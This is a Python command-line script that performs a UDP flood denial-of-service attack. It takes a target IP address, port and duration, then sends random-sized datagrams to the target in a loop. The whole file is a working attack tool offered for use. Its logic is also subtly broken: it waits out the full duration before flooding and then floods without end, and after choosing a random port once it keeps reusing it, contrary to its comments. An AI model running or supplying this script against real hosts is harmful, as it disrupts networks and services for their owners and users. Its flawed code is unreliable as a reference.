import socket
import sys
import random
import time

def udp_flood(ip, port, duration):
    """
    Performs a UDP flood attack.

    Args:
      ip: The target IP address.
      port: The target port. If 0, random ports will be used.
      duration: The duration of the attack in seconds. If 0, the attack will continue indefinitely.
    """

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("udp flood - aning")  # Keep the original print message

    try:
        if port != 0 and duration != 0:
            # Timed flood to a specific port
            time.sleep(duration)
        elif port == 0 and duration != 0:
            # Timed flood to random ports
            time.sleep(duration)
        
        while True:
            size = random.randint(1, 65507)  # Generate random packet size
            if port == 0:
                port = random.randint(1, 65535)
            sock.sendto(bytes(size), (ip, port))

    except KeyboardInterrupt:
        print("Attack stopped.")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <ip> <port> <time>")
        print("if arg1/2 = 0, randports/continuous packets.")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    udp_flood(ip, port, duration)
